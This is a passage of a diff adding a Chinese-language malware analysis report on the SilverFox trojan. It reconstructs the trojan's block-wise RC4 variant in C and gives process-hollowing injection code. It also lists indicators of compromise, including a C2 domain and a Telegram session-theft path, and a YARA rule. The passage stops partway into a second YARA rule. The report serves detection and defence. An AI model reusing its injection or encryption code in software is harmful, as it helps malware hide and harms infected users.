+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">256</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
+<span class="w">        </span><span class="n">state</span><span class="o">-&gt;</span><span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="p">)</span><span class="n">i</span><span class="p">;</span>
+
+<span class="w">    </span><span class="c1">// KSA - Key Scheduling Algorithm</span>
+<span class="w">    </span><span class="n">j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">256</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="n">j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">j</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">state</span><span class="o">-&gt;</span><span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="n">key_len</span><span class="p">])</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xFF</span><span class="p">;</span>
+<span class="w">        </span><span class="c1">// swap S[i] and S[j]</span>
+<span class="w">        </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">tmp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">state</span><span class="o">-&gt;</span><span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+<span class="w">        </span><span class="n">state</span><span class="o">-&gt;</span><span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">state</span><span class="o">-&gt;</span><span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
+<span class="w">        </span><span class="n">state</span><span class="o">-&gt;</span><span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tmp</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="n">state</span><span class="o">-&gt;</span><span class="n">block_index</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// 位置依赖的块密钥派生</span>
+<span class="kt">void</span><span class="w"> </span><span class="nf">rc4_block_key</span><span class="p">(</span><span class="n">RC4_STATE</span><span class="w"> </span><span class="o">*</span><span class="n">state</span><span class="p">,</span><span class="w"> </span>
+<span class="w">                   </span><span class="k">const</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">base_key</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">base_key_len</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="c1">// 每个块使用不同的种子值</span>
+<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">block_seed</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+<span class="w">    </span><span class="n">memset</span><span class="p">(</span><span class="n">block_seed</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">block_seed</span><span class="p">));</span>
+
+<span class="w">    </span><span class="c1">// 将块索引混入密钥</span>
+<span class="w">    </span><span class="n">block_seed</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">block_index</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="mi">24</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xFF</span><span class="p">;</span>
+<span class="w">    </span><span class="n">block_seed</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">block_index</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="mi">16</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xFF</span><span class="p">;</span>
+<span class="w">    </span><span class="n">block_seed</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">block_index</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="mi">8</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xFF</span><span class="p">;</span>
+<span class="w">    </span><span class="n">block_seed</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">state</span><span class="o">-&gt;</span><span class="n">block_index</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xFF</span><span class="p">;</span>
+
+<span class="w">    </span><span class="c1">// 派生块密钥: block_key = SHA256(base_key || block_seed)</span>
+<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">block_key</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+<span class="w">    </span><span class="n">sha256</span><span class="p">(</span><span class="n">base_key</span><span class="p">,</span><span class="w"> </span><span class="n">base_key_len</span><span class="p">,</span><span class="w"> </span>
+<span class="w">           </span><span class="n">block_seed</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span><span class="w"> </span>
+<span class="w">           </span><span class="n">block_key</span><span class="p">);</span>
+
+<span class="w">    </span><span class="c1">// 重新初始化 RC4 状态</span>
+<span class="w">    </span><span class="n">rc4_init</span><span class="p">(</span><span class="n">state</span><span class="p">,</span><span class="w"> </span><span class="n">block_key</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">);</span>
+
+<span class="w">    </span><span class="n">state</span><span class="o">-&gt;</span><span class="n">block_index</span><span class="o">++</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// 加密/解密单个块（标准 PRGA）</span>
+<span class="kt">void</span><span class="w"> </span><span class="nf">rc4_crypt_block</span><span class="p">(</span><span class="n">RC4_STATE</span><span class="w"> </span><span class="o">*</span><span class="n">state</span><span class="p">,</span><span class="w"> </span>
+<span class="w">                     </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">len</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">y</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">len</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="n">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">x</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xFF</span><span class="p">;</span>
+<span class="w">        </span><span class="n">y</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">y</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">state</span><span class="o">-&gt;</span><span class="n">S</span><span class="p">[</span><span class="n">x</span><span class="p">])</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xFF</span><span class="p">;</span>
+
+<span class="w">        </span><span class="c1">// swap S[x] and S[y]</span>
+<span class="w">        </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">tmp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">state</span><span class="o">-&gt;</span><span class="n">S</span><span class="p">[</span><span class="n">x</span><span class="p">];</span>
+<span class="w">        </span><span class="n">state</span><span class="o">-&gt;</span><span class="n">S</span><span class="p">[</span><span class="n">x</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">state</span><span class="o">-&gt;</span><span class="n">S</span><span class="p">[</span><span class="n">y</span><span class="p">];</span>
+<span class="w">        </span><span class="n">state</span><span class="o">-&gt;</span><span class="n">S</span><span class="p">[</span><span class="n">y</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tmp</span><span class="p">;</span>
+
+<span class="w">        </span><span class="c1">// XOR 生成密钥流</span>
+<span class="w">        </span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">^=</span><span class="w"> </span><span class="n">state</span><span class="o">-&gt;</span><span class="n">S</span><span class="p">[(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">S</span><span class="p">[</span><span class="n">x</span><span class="p">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">state</span><span class="o">-&gt;</span><span class="n">S</span><span class="p">[</span><span class="n">y</span><span class="p">])</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xFF</span><span class="p">];</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1">// 主加密函数（分块处理）</span>
+<span class="kt">void</span><span class="w"> </span><span class="nf">silverfox_rc4_encrypt</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">key_len</span><span class="p">,</span>
+<span class="w">                           </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">data_len</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="n">RC4_STATE</span><span class="w"> </span><span class="n">state</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">offset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">remaining</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">data_len</span><span class="p">;</span>
+
+<span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">remaining</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">block_size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">remaining</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">RC4_BLOCK_SIZE</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w"> </span>
+<span class="w">                         </span><span class="nl">RC4_BLOCK_SIZE</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">remaining</span><span class="p">;</span>
+
+<span class="w">        </span><span class="c1">// 每个块使用位置依赖密钥重新初始化</span>
+<span class="w">        </span><span class="n">rc4_block_key</span><span class="p">(</span><span class="o">&amp;</span><span class="n">state</span><span class="p">,</span><span class="w"> </span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="n">key_len</span><span class="p">);</span>
+
+<span class="w">        </span><span class="c1">// 加密当前块</span>
+<span class="w">        </span><span class="n">rc4_crypt_block</span><span class="p">(</span><span class="o">&amp;</span><span class="n">state</span><span class="p">,</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">offset</span><span class="p">,</span><span class="w"> </span><span class="n">block_size</span><span class="p">);</span>
+
+<span class="w">        </span><span class="n">offset</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">block_size</span><span class="p">;</span>
+<span class="w">        </span><span class="n">remaining</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="n">block_size</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p><strong>RC4 变体关键特征：</strong></p>
+<table>
+<thead>
+<tr>
+<th>特征</th>
+<th>标准 RC4</th>
+<th>银狐 RC4 变体</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>密钥调度</td>
+<td>一次 KSA</td>
+<td>每块重新 KSA</td>
+</tr>
+<tr>
+<td>块处理</td>
+<td>无分块</td>
+<td>4096 字节分块</td>
+</tr>
+<tr>
+<td>密钥派生</td>
+<td>固定密钥</td>
+<td>块索引混入密钥</td>
+</tr>
+<tr>
+<td>位置依赖</td>
+<td>无</td>
+<td>block_index 参与 SHA256</td>
+</tr>
+</tbody>
+</table>
+<p>这种变体设计使得即使已知部分明文，也无法直接推导其他块的密钥流，增加了密码分析的难度。</p>
+<h3>6.6 进程镂空注入</h3>
+<p>银狐木马使用进程镂空（Process Hollowing）技术将自身代码注入到合法进程中运行，以规避进程监控：</p>
+<div class="highlight"><pre><span></span><code><span class="err">进程镂空注入流程</span><span class="o">:</span>
+<span class="w">  </span><span class="mi">1</span><span class="o">.</span><span class="w"> </span><span class="n">CreateProcess</span><span class="o">(</span><span class="n">SUSPENDED</span><span class="o">)</span><span class="w">      </span><span class="err">→</span><span class="w"> </span><span class="err">创建挂起的合法进程</span>
+<span class="w">  </span><span class="mi">2</span><span class="o">.</span><span class="w"> </span><span class="n">NtUnmapViewOfSection</span><span class="w">          </span><span class="err">→</span><span class="w"> </span><span class="err">取消映射原始映像</span>
+<span class="w">  </span><span class="mi">3</span><span class="o">.</span><span class="w"> </span><span class="n">VirtualAllocEx</span><span class="o">(</span><span class="n">EXECUTE_READWRITE</span><span class="o">)</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="err">分配新内存</span>
+<span class="w">  </span><span class="mi">4</span><span class="o">.</span><span class="w"> </span><span class="n">WriteProcessMemory</span><span class="w">            </span><span class="err">→</span><span class="w"> </span><span class="err">写入恶意代码</span>
+<span class="w">  </span><span class="mi">5</span><span class="o">.</span><span class="w"> </span><span class="n">SetThreadContext</span><span class="o">(</span><span class="n">RIP</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Entry</span><span class="o">)</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="err">修改入口点</span>
+<span class="w">  </span><span class="mi">6</span><span class="o">.</span><span class="w"> </span><span class="n">ResumeThread</span><span class="w">                  </span><span class="err">→</span><span class="w"> </span><span class="err">恢复执行</span>
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><span class="cm">/*</span>
+<span class="cm"> * 进程镂空注入（伪代码还原）</span>
+<span class="cm"> */</span>
+<span class="n">BOOL</span><span class="w"> </span><span class="nf">process_hollow_inject</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">wchar_t</span><span class="w"> </span><span class="o">*</span><span class="n">target_exe</span><span class="p">,</span><span class="w"> </span>
+<span class="w">                          </span><span class="n">BYTE</span><span class="w"> </span><span class="o">*</span><span class="n">malicious_pe</span><span class="p">,</span><span class="w"> </span><span class="n">DWORD</span><span class="w"> </span><span class="n">pe_size</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="n">STARTUPINFOW</span><span class="w"> </span><span class="n">si</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+<span class="w">    </span><span class="n">PROCESS_INFORMATION</span><span class="w"> </span><span class="n">pi</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+
+<span class="w">    </span><span class="c1">// 1. 以挂起状态创建目标进程</span>
+<span class="w">    </span><span class="n">CreateProcessW</span><span class="p">(</span><span class="n">target_exe</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">FALSE</span><span class="p">,</span>
+<span class="w">                  </span><span class="n">CREATE_SUSPENDED</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">si</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
+
+<span class="w">    </span><span class="c1">// 2. 获取目标进程 PEB 地址</span>
+<span class="w">    </span><span class="n">DWORD_PTR</span><span class="w"> </span><span class="n">pebAddress</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">    </span><span class="n">NtQueryInformationProcess</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span><span class="w"> </span>
+<span class="w">                              </span><span class="n">ProcessBasicInformation</span><span class="p">,</span><span class="w"> </span>
+<span class="w">                              </span><span class="o">&amp;</span><span class="n">pebAddress</span><span class="p">,</span><span class="w"> </span><span class="p">...);</span>
+
+<span class="w">    </span><span class="c1">// 3. 读取原始 ImageBaseAddress</span>
+<span class="w">    </span><span class="n">DWORD_PTR</span><span class="w"> </span><span class="n">originalBase</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">    </span><span class="n">ReadProcessMemory</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span><span class="w"> </span>
+<span class="w">                      </span><span class="p">(</span><span class="n">LPCVOID</span><span class="p">)(</span><span class="n">pebAddress</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x10</span><span class="p">),</span>
+<span class="w">                      </span><span class="o">&amp;</span><span class="n">originalBase</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">),</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
+
+<span class="w">    </span><span class="c1">// 4. 取消映射原始映像</span>
+<span class="w">    </span><span class="n">NtUnmapViewOfSection</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">PVOID</span><span class="p">)</span><span class="n">originalBase</span><span class="p">);</span>
+
+<span class="w">    </span><span class="c1">// 5. 分配新的可执行内存</span>
+<span class="w">    </span><span class="n">PVOID</span><span class="w"> </span><span class="n">newBase</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">pe_size</span><span class="p">,</span>
+<span class="w">                                    </span><span class="n">MEM_COMMIT</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">MEM_RESERVE</span><span class="p">,</span>
+<span class="w">                                    </span><span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
+
+<span class="w">    </span><span class="c1">// 6. 写入恶意 PE</span>
+<span class="w">    </span><span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span><span class="w"> </span><span class="n">newBase</span><span class="p">,</span><span class="w"> </span>
+<span class="w">                       </span><span class="n">malicious_pe</span><span class="p">,</span><span class="w"> </span><span class="n">pe_size</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
+
+<span class="w">    </span><span class="c1">// 7. 修正入口点并恢复线程</span>
+<span class="w">    </span><span class="n">CONTEXT</span><span class="w"> </span><span class="n">ctx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+<span class="w">    </span><span class="n">ctx</span><span class="p">.</span><span class="n">ContextFlags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CONTEXT_FULL</span><span class="p">;</span>
+<span class="w">    </span><span class="n">GetThreadContext</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ctx</span><span class="p">);</span>
+<span class="w">    </span><span class="n">ctx</span><span class="p">.</span><span class="n">Rip</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">newBase</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">entry_point_rva</span><span class="p">;</span>
+<span class="w">    </span><span class="n">SetThreadContext</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ctx</span><span class="p">);</span>
+
+<span class="w">    </span><span class="n">ResumeThread</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>
+
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<hr />
+<h2>七、IOC 提取</h2>
+<h3>7.1 文件 Hash</h3>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>值</th>
+<th>关联组件</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MD5</td>
+<td><code>8c4fc902905459a53f686372a1a85526</code></td>
+<td>初始样本 (ldplayer9_ld_112_ld.exe)</td>
+</tr>
+<tr>
+<td>MD5</td>
+<td><code>319c718edc390a304acb0bc8886e0da5</code></td>
+<td>恶意 DLL (wjcapture.dll)</td>
+</tr>
+</tbody>
+</table>
+<h3>7.2 网络指标</h3>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>值</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Domain</td>
+<td><code>oidng2.duoshit.com</code></td>
+<td>C2 控制服务器域名</td>
+</tr>
+<tr>
+<td>IP</td>
+<td><code>223.5.5.5</code></td>
+<td>DoH 通信中转（阿里公共DNS）</td>
+</tr>
+<tr>
+<td>IP</td>
+<td><code>8.8.8.8</code></td>
+<td>DoH 通信中转（Google DNS）</td>
+</tr>
+<tr>
+<td>URL Pattern</td>
+<td><code>https://223.5.5.5/dns-query?dns=*</code></td>
+<td>DoH 请求 URL 模式</td>
+</tr>
+<tr>
+<td>URL Pattern</td>
+<td><code>https://8.8.8.8/dns-query?dns=*</code></td>
+<td>DoH 请求 URL 模式</td>
+</tr>
+</tbody>
+</table>
+<h3>7.3 行为指标</h3>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>文件释放</td>
+<td>释放 <code>wjcapture.dll</code> 到安装目录</td>
+</tr>
+<tr>
+<td>配置文件</td>
+<td>读取同目录下的 <code>Update.xml</code></td>
+</tr>
+<tr>
+<td>API 调用</td>
+<td><code>SetWindowsHookExA</code> (WH_KEYBOARD_LL)</td>
+</tr>
+<tr>
+<td>目录访问</td>
+<td><code>%APPDATA%\Telegram Desktop\tdata\</code></td>
+</tr>
+<tr>
+<td>网络行为</td>
+<td>DNS 查询封装在 HTTPS 请求中</td>
+</tr>
+<tr>
+<td>进程行为</td>
+<td>CreateProcess(SUSPENDED) + NtUnmapViewOfSection</td>
+</tr>
+<tr>
+<td>保护特征</td>
+<td>VMProtect 虚拟化（67% 函数覆盖率）</td>
+</tr>
+<tr>
+<td>导出函数</td>
+<td>DLL 导出函数名 <code>Fuck</code></td>
+</tr>
+</tbody>
+</table>
+<h3>7.4 YARA 检测规则</h3>
+<div class="highlight"><pre><span></span><code><span class="kd">rule</span><span class="w"> </span>S<span class="n">ilverFox_DoH_Trojan</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">meta</span><span class="p">:</span>
+<span class="w">        </span><span class="n">description</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s2">&quot;银狐木马 DoH 隐蔽通信变体检测规则&quot;</span>
+<span class="w">        </span><span class="n">author</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s2">&quot;Security Research Lab&quot;</span>
+<span class="w">        </span><span class="n">date</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s2">&quot;2026-07-25&quot;</span>
+
+<span class="w">    </span><span class="k">strings</span><span class="p">:</span>
+<span class="w">        </span><span class="c1">// C2 域名</span>
+<span class="w">        </span><span class="nv">$c2_domain</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s2">&quot;oidng2.duoshit.com&quot;</span><span class="w"> </span><span class="nb">ascii</span><span class="w"> </span><span class="nb">wide</span>
+
+<span class="w">        </span><span class="c1">// DoH 通信 URL 模式</span>
+<span class="w">        </span><span class="nv">$doh_ali</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s2">&quot;223.5.5.5/dns-query&quot;</span><span class="w"> </span><span class="nb">ascii</span>
+<span class="w">        </span><span class="nv">$doh_google</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s2">&quot;8.8.8.8/dns-query&quot;</span><span class="w"> </span><span class="nb">ascii</span>
+
+<span class="w">        </span><span class="c1">// 导出函数名特征</span>
+<span class="w">        </span><span class="nv">$export_name</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s2">&quot;Fuck&quot;</span><span class="w"> </span><span class="nb">ascii</span><span class="w"> </span><span class="nb">wide</span>
+
+<span class="w">        </span><span class="c1">// Telegram tdata 窃取路径</span>
+<span class="w">        </span><span class="nv">$telegram_path</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s2">&quot;Telegram Desktop\\tdata&quot;</span><span class="w"> </span><span class="nb">wide</span>
+
+<span class="w">        </span><span class="c1">// VMProtect 特征字节</span>
+<span class="w">        </span><span class="nv">$vmp_magic</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span>35<span class="w"> </span>DB<span class="w"> </span>8B<span class="w"> </span>C1<span class="w"> </span>48<span class="w"> </span>8B<span class="w"> </span><span class="p">}</span><span class="w">  </span><span class="c1">// VMProtect 入口典型字节序列</span>
+
+<span class="w">        </span><span class="c1">// DLL 名称</span>
+<span class="w">        </span><span class="nv">$dll_name</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s2">&quot;wjcapture.dll&quot;</span><span class="w"> </span><span class="nb">ascii</span>
+
+<span class="w">    </span><span class="k">condition</span><span class="p">:</span>
+<span class="w">        </span><span class="nb">uint16</span><span class="p">(</span>0<span class="p">)</span><span class="w"> </span><span class="p">==</span><span class="w"> </span>0<span class="n">x5A4D</span><span class="w"> </span><span class="ow">and</span><span class="w">  </span><span class="c1">// MZ header</span>
+<span class="w">        </span><span class="p">(</span>
+<span class="w">            </span><span class="c1">// 匹配 C2 域名 + DoH 模式</span>
+<span class="w">            </span><span class="p">(</span><span class="nv">$c2_domain</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="p">(</span><span class="nv">$doh_ali</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="nv">$doh_google</span><span class="p">))</span>
+<span class="w">            </span><span class="ow">or</span>
+<span class="w">            </span><span class="c1">// 匹配导出函数名 + VMProtect</span>
+<span class="w">            </span><span class="p">(</span><span class="nv">$export_name</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="nv">$vmp_magic</span><span class="p">)</span>
+<span class="w">            </span><span class="ow">or</span>
+<span class="w">            </span><span class="c1">// 匹配 DLL 名称</span>
+<span class="w">            </span><span class="nv">$dll_name</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="nv">$telegram_path</span>
+<span class="w">        </span><span class="p">)</span>
+<span class="p">}</span>
+
+<span class="kd">rule</span><span class="w"> </span>INNO<span class="n">_Setup_SilverFox_Dropper</span><span class="w"> </span><span class="p">{</span>
